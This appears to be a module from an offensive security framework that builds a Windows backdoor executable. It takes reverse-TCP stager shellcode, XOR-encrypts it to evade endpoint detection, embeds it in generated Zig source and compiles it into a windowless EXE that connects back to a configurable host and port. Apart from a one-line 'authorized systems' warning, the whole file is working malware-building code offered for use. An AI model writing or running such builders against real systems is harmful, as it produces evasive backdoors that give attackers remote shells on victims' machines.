#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import (
    compile_zig_pe,
    generate_payload_bytes,
    option_value,
    prepare_exe_output,
    report_payload_size,
)
from lib.compile.xor_shellcode_runner import XorShellcodeRunnerBuilder


class Module(Backdoor):
    __info__ = {
        "name": "XOR Shellcode Runner Evasion",
        "description": (
            "Windows x64 EXE (pure Zig): XOR-encrypted embedded shellcode, RW→RX, CreateThread. "
            "Compiled with the same Zig pipeline as zig_shell_evasion."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/01_xor_shellcode_runner.c",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    sleep = OptInteger(5000, "Sleep milliseconds before execution", False)
    output_name = OptString("xor_runner.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated Zig source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem",
        False,
        ["windows", "console"],
    )

    def run(self):
        raw = generate_payload_bytes(self)
        if not raw:
            return False
        report_payload_size(raw)

        builder = XorShellcodeRunnerBuilder(sleep_ms=int(option_value(self, "sleep") or 0))
        encrypted, key = builder.encrypt_payload(raw)
        source = builder.build_zig_source(encrypted, key)

        out_dir, exe_name = prepare_exe_output(
            self,
            "backdoors/windows/evasion",
            str(option_value(self, "output_name") or "xor_runner.exe"),
        )
        exe_path = out_dir / exe_name

        if option_value(self, "save_source"):
            zig_path = out_dir / "xor_runner.zig"
            zig_path.write_text(source, encoding="utf-8")
            print_success(f"Zig source saved: {zig_path}")

        ok = compile_zig_pe(
            source=source,
            exe_path=exe_path,
            framework=getattr(self, "framework", None),
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
            windows_subsystem=str(option_value(self, "windows_subsystem") or "windows"),
        )
        if ok and exe_path.is_file():
            print_success(f"Backdoor executable generated: {exe_path} ({exe_path.stat().st_size} bytes)")
            print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
            return True
        print_error("PE compilation failed.")
        return False
